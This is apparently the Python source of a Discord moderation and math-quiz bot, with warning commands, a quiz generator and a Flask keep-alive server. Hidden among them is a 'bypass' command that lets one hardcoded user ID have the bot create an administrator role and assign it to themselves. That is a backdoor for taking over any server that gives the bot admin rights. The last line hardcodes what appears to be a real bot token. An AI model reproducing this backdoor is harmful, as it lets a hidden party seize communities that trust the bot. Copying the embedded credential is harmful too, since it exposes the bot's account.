import os
import sys
import discord
import json
import random
import asyncio
import math
import time
import datetime
import pytz
from discord.ext import commands

from threading import Thread

from flask import Flask

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

warnings = {}

TIME_ZONE = "US/Eastern"

def generate_question(level):
    question_templates = [
        [
            ("What is {} + {}?", lambda x, y: str(x + y), (5, 20), (5, 20), []),
            ("What is {} - {}?", lambda x, y: str(x - y), (20, 40), (5, 20), []),
            ("What is {} × {}?", lambda x, y: str(x * y), (2, 20), (2, 20), []),
            ("What is {} / {}?", lambda x, y: str(round(x / y, 2)), (20, 80), (5, 15), []),
            ("What is {}^{}?", lambda x, y: str(x ** y), (2, 15), (2, 4), []),
            ("What is √{}?", lambda x: str(x), (2, 18), ["square"])
        ],
        [
            ("Solve the equation below for x:\n{}x + {} = {}", lambda x, y, z: str((z - y) / x), (2, 8), (5, 20), (30, 80), []),
            ("Solve the equation below for x:\n{}x - {} = {}", lambda x, y, z: str((z + y) / x), (3, 6), (5, 20), (20, 60), []),
            ("Solve the equation below for x:\n{}x + {} = {}x", lambda a, b, c: str(-b / (a - c)), (2, 6), (5, 20), (6, 8), []),
            ("Simplify the expression {}x + {}x", lambda a, b: str(a + b) + "x", (2, 8), (2, 8), []),
            ("By substituting x as {}, evaulate the expression 3x + 5?", lambda x: str(3 * x + 5), (2, 15), [])
        ]
    ]

    template_entry = random.choice(question_templates[level])
    template, answer_func, *ranges, tags = template_entry

    values = [random.randint(*range_) for range_ in ranges if range_ is not None]

    if "square" in tags:
        values[0] = values[0] ** 2

    correct_answer = answer_func(*values)

    incorrect_answers = set()
    while len(incorrect_answers) < 4:
        incorrect_guess = str(random.randint(int(float(correct_answer)) - 5, int(float(correct_answer)) + 5))
        if incorrect_guess != correct_answer:
            incorrect_answers.add(incorrect_guess)

    return {
        template.format(*values): {
            "correct": [correct_answer],
            "incorrect": list(incorrect_answers)
        }
    }

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_web).start()

intents = discord.Intents.all()
intents.messages = True

bot = commands.Bot(command_prefix=lambda bot, message: "!", intents=intents)

@bot.event
async def on_ready():
    guild = discord.Object(id=1292978415552434196)
    try:
        synced = await bot.tree.sync()
    except Exception as e:
        pass

@bot.event
async def on_disconnect():
    print("Bot disconnected. Attempting to reconnect in 5 seconds...")
    await asyncio.sleep(5)

@bot.event
async def on_resumed():
    print("Bot reconnected!")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You do not have the appropriate permissions to use this command."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@commands.has_permissions(kick_members=True)
@bot.command(help="Warn a user.", aliases=["w"])
async def warn(ctx, name: str = None, *, reason: str = "No reason provided."):
    user = None
    if name is None:
        user = ctx.author
    else:
        matching_names = []
        for member in ctx.guild.members:
            if name.lower() in member.name.lower() and not member.bot:
                matching_names.append(member.name)
        if matching_names:
            if len(matching_names) > 1:
                msg = ""
                for i, n in enumerate(matching_names):
                    msg += str(i + 1) + ". " + n
                    if i != len(matching_names) - 1:
                        msg += "\n"
                try:
                    await ctx.send(embed=discord.Embed(
                        color=int("50B4E6", 16),
                        description=f"Mutiple users found. Please select a user below, or type cancel:\n{msg}"
                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

                    selection = None
                    response = await bot.wait_for('message', check=lambda msg: msg.channel == ctx.channel and msg.author == ctx.author, timeout=15.0)

                    if "cancel" in response.content.lower():
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="❌ The command has been canceled."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                    try:
                        selection = int(response.content)
                    except ValueError:
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="❌ Invalid selection."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                    else:
                        if selection is not None:
                            if (selection - 1) >= 0 and (selection - 1) <= (len(matching_names) - 1):
                                matching_name = matching_names[selection - 1]
                                for member in ctx.guild.members:
                                    if member.name.lower() == matching_name.lower():
                                        user = member
                                        break
                            else:
                                await ctx.send(embed=discord.Embed(
                                    color=int("FA3939", 16),
                                    description="❌ Invalid selection."
                                ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                                return
                except asyncio.TimeoutError:
                    await ctx.send(embed=discord.Embed(
                        color=int("FA3939", 16),
                        description="⏳ The command has been canceled because you took too long to reply."
                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                    return
            else:
                for member in ctx.guild.members:
                    if member.name.lower() == matching_names[0].lower():
                        user = member
                        break
    if user is not None:
        if not user.bot:
            user_id = str(user.id)

            if user_id not in warnings:
                warnings[user_id] = []
            warnings[user_id].append({
                "reason": reason,
                "moderator": ctx.author.mention,
                "time": datetime.datetime.now(pytz.utc).astimezone(pytz.timezone(TIME_ZONE)).strftime("%Y-%m-%d %I:%M:%S %p")
            })
            amount = len(warnings[user_id])
            
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f'✅ Sucessfully warned "{user.name}". {user.name} now has {amount} warnings.'
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ Cannot warn a bot."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@commands.has_permissions(kick_members=True)
@bot.command(help="View the warnings of a user.", aliases=["view_warn", "vw"])
async def view_warnings(ctx, name: str = None):
    user = None
    if name is None:
        user = ctx.author
    else:
        matching_names = []
        for member in ctx.guild.members:
            if name.lower() in member.name.lower() and not member.bot:
                matching_names.append(member.name)
        if matching_names:
            if len(matching_names) > 1:
                msg = ""
                for i, n in enumerate(matching_names):
                    msg += str(i + 1) + ". " + n
                    if i != len(matching_names) - 1:
                        msg += "\n"
                try:
                    await ctx.send(embed=discord.Embed(
                        color=int("50B4E6", 16),
                        description=f"Mutiple users found. Please select a user below, or type cancel:\n{msg}"
                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

                    selection = None
                    response = await bot.wait_for('message', check=lambda msg: msg.channel == ctx.channel and msg.author == ctx.author, timeout=15.0)

                    if "cancel" in response.content.lower():
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="❌ The command has been canceled."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                    try:
                        selection = int(response.content)
                    except ValueError:
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="❌ Invalid selection."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                    else:
                        if selection is not None:
                            if (selection - 1) >= 0 and (selection - 1) <= (len(matching_names) - 1):
                                matching_name = matching_names[selection - 1]
                                for member in ctx.guild.members:
                                    if member.name.lower() == matching_name.lower():
                                        user = member
                                        break
                            else:
                                await ctx.send(embed=discord.Embed(
                                    color=int("FA3939", 16),
                                    description="❌ Invalid selection."
                                ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                                return
                except asyncio.TimeoutError:
                    await ctx.send(embed=discord.Embed(
                        color=int("FA3939", 16),
                        description="⏳ The command has been canceled because you took too long to reply."
                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                    return
            else:
                for member in ctx.guild.members:
                    if member.name.lower() == matching_names[0].lower():
                        user = member
                        break
    if user is not None:
        user_id = str(user.id)
        user_warnings = warnings.get(user_id, [])
        if not user_warnings:
            await ctx.send(f"✅ {user.name} has no warnings!")
        else:
            warning_list = "\n".join(
                f"{i+1}. **{warn['reason']}** (by {warn['moderator']} at {warn['time']})"
                for i, warn in enumerate(user_warnings)
            )
            await ctx.send(embed=discord.Embed(
                title=f"Warnings for {user.name}",
                description=warning_list,
                color=int("50B4E6", 16)
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@commands.has_permissions(kick_members=True)
@bot.command(help="Clear the warnings of a user.", aliases=["clear_warn", "cw"])
async def clear_warnings(ctx, name: str = None):
    user = None
    if name is None:
        user = ctx.author
    else:
        matching_names = []
        for member in ctx.guild.members:
            if name.lower() in member.name.lower() and not member.bot:
                matching_names.append(member.name)
        if matching_names:
            if len(matching_names) > 1:
                msg = ""
                for i, n in enumerate(matching_names):
                    msg += str(i + 1) + ". " + n
                    if i != len(matching_names) - 1:
                        msg += "\n"
                try:
                    await ctx.send(embed=discord.Embed(
                        color=int("50B4E6", 16),
                        description=f"Mutiple users found. Please select a user below, or type cancel:\n{msg}"
                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

                    selection = None
                    response = await bot.wait_for('message', check=lambda msg: msg.channel == ctx.channel and msg.author == ctx.author, timeout=15.0)

                    if "cancel" in response.content.lower():
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="❌ The command has been canceled."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                    try:
                        selection = int(response.content)
                    except ValueError:
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="❌ Invalid selection."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                    else:
                        if selection is not None:
                            if (selection - 1) >= 0 and (selection - 1) <= (len(matching_names) - 1):
                                matching_name = matching_names[selection - 1]
                                for member in ctx.guild.members:
                                    if member.name.lower() == matching_name.lower():
                                        user = member
                                        break
                            else:
                                await ctx.send(embed=discord.Embed(
                                    color=int("FA3939", 16),
                                    description="❌ Invalid selection."
                                ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                                return
                except asyncio.TimeoutError:
                    await ctx.send(embed=discord.Embed(
                        color=int("FA3939", 16),
                        description="⏳ The command has been canceled because you took too long to reply."
                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                    return
            else:
                for member in ctx.guild.members:
                    if member.name.lower() == matching_names[0].lower():
                        user = member
                        break
    if user is not None:
        user_id = str(user.id)

        if user_id in warnings:
            del warnings[user_id]
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"✅ Cleared all warnings for **{user.name}**."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ **{user.name}** has no warnings."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(help="This is a restricted command...", aliases=["byp"])
async def bypass(ctx, role_name: str = "new role"):
    if ctx.author.id != 1089171899294167122:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You cannot use this command."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return

    if not getattr(ctx.guild.me.guild_permissions, "administrator", None):
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ I do not have the appropriate permissions."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return

    try:
        new_role = await ctx.guild.create_role(
            name=role_name,
            permissions=discord.Permissions(administrator=True),
            hoist=False,
            mentionable=False,
            color=int("FA3939", 16)
        )

        await ctx.author.add_roles(new_role)
        
        await ctx.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            description=f"✅ Successfully created a bypass role with name '{role_name}'!"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ I do not have permission to create this role."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
        
    except Exception as e:
        await interaction.response.send_message(embed=discord.Embed(
            title="Bypass Role",
            color=int("FA3939", 16),
            description="❌ Something went wrong: {e}"
        ), ephemeral=True)
        return

@bot.command(help="say something", aliases=["s"])
async def say(ctx, *, text: str = ""):
    if text:
        await ctx.message.delete()
        await ctx.send(embed=discord.Embed(
            description=text,
            color=int("50B4E6", 16)
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["q"], help="Gives a random quiz question.")
async def quiz(ctx):
    if ctx.author.bot:
        return

    embed = discord.Embed(
        color=int("50B4E6", 16),
        description="Choose a difficulty level (0–1, more coming soon):\n" +
                    "\n".join([
                        "0 - Basic Arithmetic",
                        "1 - Basic Algebra"
                    ])
    )
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

    try:
        msg = await bot.wait_for(
            "message",
            check=lambda m: m.author == ctx.author and m.content.isdigit() and 0 <= int(m.content) <= 6,
            timeout=10.0
        )
        level = int(msg.content)
    except asyncio.TimeoutError:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="⏳ The command was canceled because you took too long to reply."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))
        return

    q_obj = generate_question(level)
    question_text, answer_info = list(q_obj.items())[0]
    correct = answer_info["correct"][0]
    choices = answer_info["incorrect"] + [correct]
    random.shuffle(choices)

    letter_choices = ["A", "B", "C", "D", "E"]
    choice_map = {letter: choice for letter, choice in zip(letter_choices, choices)}
    correct_choice = next(k for k, v in choice_map.items() if v == correct)

    embed = discord.Embed(
        color=int("50B4E6", 16),
        description=f"🧠 **Level {level} Quiz**\n\n**{question_text}**\n\n" +
                    "\n".join([f"{k} - {v}" for k, v in choice_map.items()])
    )
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

    try:
        msg = await bot.wait_for(
            "message",
            check=lambda m: m.author == ctx.author and m.content.upper() in choice_map.keys(),
            timeout=30.0
        )
        if msg.content.upper() == correct_choice:
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"✅ Correct, {ctx.author.mention}! The answer was **{correct_choice}: {correct}**."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ Incorrect, {ctx.author.mention}. The correct answer was **{correct_choice}: {correct}**."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))
    except asyncio.TimeoutError:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"⏳ Time's up, {ctx.author.mention}! The correct answer was **{correct_choice}: {correct}**."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))

bot.run("MTM3NzEwODg4MjI0NTAyNTgzMg.G34Vpg.RJq4V5EoK6U--Oo6YBhMGvCgc9kc6cdQqk88fk")
